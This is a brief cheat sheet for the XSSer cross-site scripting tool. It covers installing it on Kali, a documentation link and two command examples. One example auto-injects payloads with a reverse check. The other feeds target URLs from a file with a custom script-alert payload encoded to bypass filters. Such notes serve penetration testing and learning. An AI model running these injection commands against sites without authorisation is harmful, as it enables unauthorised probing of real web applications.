# XSSer
https://github.com/epsylon/xsser
## Install
1.  install via apt on kali
```
sudo apt install xsser
```
## Documentation
https://github.com/epsylon/xsser/tree/master/doc
## Examples
### Multiple injections from URL, with automatic payloading, establishing a reverse connection and showing statistics with verbose output and saving results to file (XSSreport.raw)
```
xsser -u "https:/target.com/XSS" --auto --reverse-check -s --verbose --save
```
### Multiple target URLs from a file, payloading your -own- code and using Unescape() character encoding to bypass filters
```
xsser -i "urls.txt" --payload "<script>alert('XSSed');</script>" --Une
```